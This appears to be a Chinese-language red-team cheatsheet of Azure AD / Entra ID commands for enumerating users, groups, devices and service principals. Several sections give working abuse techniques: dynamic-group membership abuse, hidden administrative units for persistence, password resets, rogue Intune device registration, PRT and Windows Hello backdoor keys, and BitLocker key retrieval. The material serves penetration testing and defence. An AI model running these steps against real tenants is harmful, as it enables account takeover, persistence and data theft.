# Azure AD - 身份和访问管理 (IAM)

> 根管理组 (租户) > 管理组 > 订阅 > 资源组 > 资源

* 用户 (Users)（用户、组、动态组）
* 设备 (Devices)
* 服务主体 (Service Principals)（应用程序和托管身份）

## 用户 (Users)

* 列出用户：`Get-AzureADUser -All $true`
* 枚举组 (Enumerate groups)

    ```ps1
    # 列出组
    Get-AzureADGroup -All $true
    
    # 获取组内成员
    Get-AzADGroup -DisplayName '<GROUP-NAME>'
    Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName
    ```

* 枚举角色：`Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember`
* 列出角色：`Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName`
* 将用户添加到组

    ```ps1
    $groupid = "<group-id>"
    $targetmember = "<user-id>"
    $group = Get-MgGroup -GroupId $groupid
    $members = Get-MgGroupMember -GroupId $groupid
    New-MgGroupMember -GroupId $groupid -DirectoryObjectid $targetmember
    ```

### 动态组成员身份 (Dynamic Group Membership)

获取允许动态成员身份的组：

* Powershell Azure AD：`Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}`
* RoadRecon 数据库：`select objectId, displayName, description, membershipRule, membershipRuleProcessingState, isMembershipRuleLocked from groups where membershipRule is not null;`

规则示例：`(user.otherMails -any (_ -contains "vendor")) -and (user.userType -eq "guest")`
规则说明：任何备用电子邮件中包含字符串 'vendor' 的访客用户都将被添加到该组中。

1. 打开用户档案，点击 **管理 (Manage)**
2. 点击 **重新发送 (Resend)** 邀请以获取邀请 URL
3. 设置备用电子邮件 (secondary email)

    ```powershell
    PS> Set-AzureADUser -ObjectId <OBJECT-ID> -OtherMails <Username>@<TENANT NAME>.onmicrosoft.com -Verbose
    ```

### 管理单元 (Administrative Unit / AU)

枚举管理单元 (Administrative Units)。

```ps1
PS AzureAD> Get-AzureADMSAdministrativeUnit -All $true
PS AzureAD> Get-AzureADMSAdministrativeUnit -Id <ID>
PS AzureAD> Get-AzureADMSAdministrativeUnitMember -Id <ID>
PS AzureAD> Get-AzureADMSScopedRoleMembership -Id <ID> | fl
PS AzureAD> Get-AzureADDirectoryRole -ObjectId <RoleId>
PS AzureAD> Get-AzureADUser -ObjectId <RoleMemberInfo.Id> | fl
```

管理单元可用作持久化机制。当 `visibility` 属性设置为 `HiddenMembership` 时，只有该管理单元的成员才能列出该管理单元内的其他成员。

```ps1
az rest \
  --method post \
  --url https://graph.microsoft.com/v1.0/directory/administrativeUnits \
  --body '{"displayName": "Hidden AU Administrative Unit", "isMemberManagementRestricted":false, "visibility": "HiddenMembership"}'
```

* 使用 `New-MgDirectoryAdministrativeUnit` cmdlet 创建一个新的管理单元。

    ```ps1
    Connect-MgGraph -Scopes "AdministrativeUnit.ReadWrite.All"
    Import-Module Microsoft.Graph.Identity.DirectoryManagement

    $params = @{
        displayName = "Marketing Department"
        description = "Marketing Department Administration"
        visibility = "HiddenMembership"
    }

    New-MgDirectoryAdministrativeUnit -BodyParameter $params
    ```

* 使用 `New-MgDirectoryAdministrativeUnitMemberByRef` 添加成员

    ```ps1
    Connect-MgGraph -Scopes "AdministrativeUnit.ReadWrite.All"
    Import-Module Microsoft.Graph.Identity.DirectoryManagement

    $administrativeUnitId = "0b22c83d-c5ac-43f2-bb6e-88af3016d49f"
    $paramsUser1 = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/users/52e26d18-d251-414f-af14-a4a93123b2b2"
    }
    New-MgDirectoryAdministrativeUnitMemberByRef -AdministrativeUnitId $administrativeUnitId -BodyParameter $paramsUser1
    ```

* 即使管理单元被隐藏，也可以列出成员。

    ```ps1
    Connect-MgGraph -Scopes "AdministrativeUnit.Read.All", "Member.Read.Hidden", "Directory.Read.All"
    Import-Module Microsoft.Graph.Identity.DirectoryManagement

    $administrativeUnitId = "0b22c83d-c5ac-43f2-bb6e-88af3016d49f"
    Get-MgDirectoryAdministrativeUnitMemberAsUser -AdministrativeUnitId $administrativeUnitId
    ```

* 分配 `用户管理员 (User Administrator)` 角色，其 ID 在该租户中为 `947ccf23-ee27-4951-8110-96c62c680311`。

    ```ps1
    Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory"
    Import-Module Microsoft.Graph.Identity.DirectoryManagement

    $administrativeUnitId = "0b22c83d-c5ac-43f2-bb6e-88af3016d49f"
    $userAdministratorRoleId = "947ccf23-ee27-4951-8110-96c62c680311"
    $params = @{
        roleId = $userAdministratorRoleId
        roleMemberInfo = @{
            id = "61b0d52f-a902-4769-9a09-c6528336b00a"
        }
    }

    New-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId $administrativeUnitId -BodyParameter $params
    ```

* 现在 ID 为 `61b0d52f-a902-4769-9a09-c6528336b00a` 的用户可以编辑该管理单元内其他用户的属性。

管理单元 (Administrative Units) 可以重置另一个用户的密码。

```powershell
PS C:\Tools> $password = "Password" | ConvertToSecureString -AsPlainText -Force
PS C:\Tools> (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "<Username>@<TENANT NAME>.onmicrosoft.com"}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose
```

### 将 GUID 转换为 SID (Convert GUID to SID)

用户的 Entra ID 通过将 `"S-1–12–1-"` 与 Entra ID 每个部分的十进制表示形式连接起来，从而转换为 SID。

```powershell
GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)]
SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)]
```

例如，`6aa89ecb-1f8f-4d92–810d-b0dce30b6c82` 的表示形式为 `S-1–12–1–1789435595–1301421967–3702525313–2188119011`。

## 设备 (Devices)

### 列出设备 (List Devices)

```ps1
Connect-AzureAD
Get-AzureADDevice
$user = Get-AzureADUser -SearchString "username"
Get-AzureADUserRegisteredDevice -ObjectId $user.ObjectId -All $true
```

### 设备状态 (Device State)

```ps1
PS> dsregcmd.exe /status
+----------------------------------------------------------------------+
| 设备状态 (Device State) |
+----------------------------------------------------------------------+
 AzureAdJoined : YES
 EnterpriseJoined : NO
 DomainJoined : NO
 设备名称 (Device Name) : jumpvm
```

* [**已加入 Azure AD (Azure AD Joined)**](https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&name=large)
* [**已加入工作区 (Workplace Joined)**](https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&name=large)
* [**混合加入 (Hybrid Joined)**](https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&name=large)
* [**在加入 AAD 或混合加入的设备上加入工作区**](https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&name=large)

### 加入设备 (Join Devices)

[在 Intune 中注册 Windows 10/11 设备](https://learn.microsoft.com/en-us/mem/intune/user-help/enroll-windows-10-device)

* [secureworks/pytune](https://github.com/secureworks/pytune) - Pytune 是一项后渗透 (post-exploitation) 工具，用于在支持多平台的情况下将伪造设备注册到 Intune 中。

    ```ps1
    用法: pytune.py [-h] {entra_join,entra_delete,enroll_intune,checkin,retire_intune,check_compliant,download_apps} ...

    python3 pytune.py entra_join -o Windows -d Windows_pytune -u testuser@*******.onmicrosoft.com -p ***********
    python3 pytune.py enroll_intune -o Windows -d Windows_pytune -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p ***********
    python3 pytune.py checkin -o Windows -d Windows_pytune -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx -u testuser@*******.onmicrosoft.com -p ***********
    python3 pytune.py check_compliant -o Windows -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p ***********
    python3 pytune.py check_compliant -o Windows -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p *********** -H $HWHASH
    ```

### 注册设备 (Register Devices)

```ps1
roadtx device -a register -n swkdeviceup
```

### Windows Hello 企业版 (Windows Hello for Business)

```ps1
roadtx.exe prtenrich --ngcmfa-drs-auth
roadtx.exe winhello -k swkdevicebackdoor.key
roadtx.exe prt -hk swkdevicebackdoor.key -u <user@domain.lab> -c swkdeviceup.pem -k swkdeviceup.key
roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
```

### Bitlocker 密钥 (Bitlocker Keys)

```ps1
Install-Module Microsoft.Graph -Scope CurrentUser
Import-Module Microsoft.Graph.Identity.SignIns
Connect-MgGraph -Scopes BitLockerKey.Read.All
Get-MgInformationProtectionBitlockerRecoveryKey -All
Get-MgInformationProtectionBitlockerRecoveryKey -BitlockerRecoveryKeyId $bitlockerRecoveryKeyId
```

## 服务主体 (Service Principals)

```ps1
PS C:\> Get-AzureADServicePrincipal

ObjectId                             AppId                                DisplayName
--------                             -----                                -----------
00221b6f-4387-4f3f-aa85-34316ad7f956 e5e29b8a-85d9-41ea-b8d1-2162bd004528 Tenant Schema Extension App
012f6450-15be-4e45-b8b4-e630f0fb70fe 00000005-0000-0ff1-ce00-000000000000 Microsoft.YammerEnterprise
06ab01eb-3e77-4d14-ae31-322c7730a65b 09abbdfd-ed23-44ee-a2d9-a627aa1c90f3 ProjectWorkManagement
092aaf41-23e8-46eb-8c3d-fc0ee91cc62f 507bc9da-c4e2-40cb-96a7-ac90df92685c Office365Reports
0ac66e69-5502-4406-a294-6dedeadc8cab 2cf9eb86-36b5-49dc-86ae-9a63135dfa8c AzureTrafficManagerandDNS
0c0a6d9d-48c0-4aa7-b484-4e46f77d8ed9 0f698dd4-f011-4d23-a33e-b36416dcb1e6 Microsoft.OfficeClientService
0cbef08e-a4b5-4dd9-865e-8f521c1c5fb4 0469d4cd-df37-4d93-8a61-f8c75b809164 Microsoft Policy Administration Service
0ea80ff0-a9ea-43b6-b876-d5989efd8228 00000009-0000-0000-c000-000000000000 Microsoft Power BI Reporting and Analytics
```

## 其他 (Other)

列出所有可用于获取 Microsoft Graph 上具有 `mail.read` 范围 (scope) 的令牌的客户端 ID：

```ps1
roadtx getscope -s https://graph.microsoft.com/mail.read
roadtx findscope -s https://graph.microsoft.com/mail.read
```

## 参考资料 (References)

* [Pentesting Azure Mindmap](https://github.com/synacktiv/Mindmaps)
* [AZURE AD cheatsheet - BlackWasp](https://hideandsec.sh/books/cheatsheets-82c/page/azure-ad)
* [Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020](https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56)
* [AZURE AD INTRODUCTION FOR RED TEAMERS - Aymeric Palhière (bak) - 2020-04-20](https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
* [Hidden in Plain Sight: Abusing Entra ID Administrative Units for Sticky Persistence - Katie Knowles - September 16, 2024](https://securitylabs.datadoghq.com/articles/abusing-entra-id-administrative-units/)
* [Create Sticky Backdoor User Through Restricted Management AU - Datadog, Inc](https://stratus-red-team.cloud/attack-techniques/entra-id/entra-id.persistence.restricted-au/)
* [Unveiling the Power of Intune: Leveraging Intune for Breaking Into Your Cloud and On-Premise - Yuya Chudo - December 11, 2024](https://i.blackhat.com/EU-24/Presentations/EU-24-Chudo-Unveiling-the-Power-of-Intune-Leveraging-Intune-for-Breaking-Into-Your-Cloud-and-On-Premise.pdf)
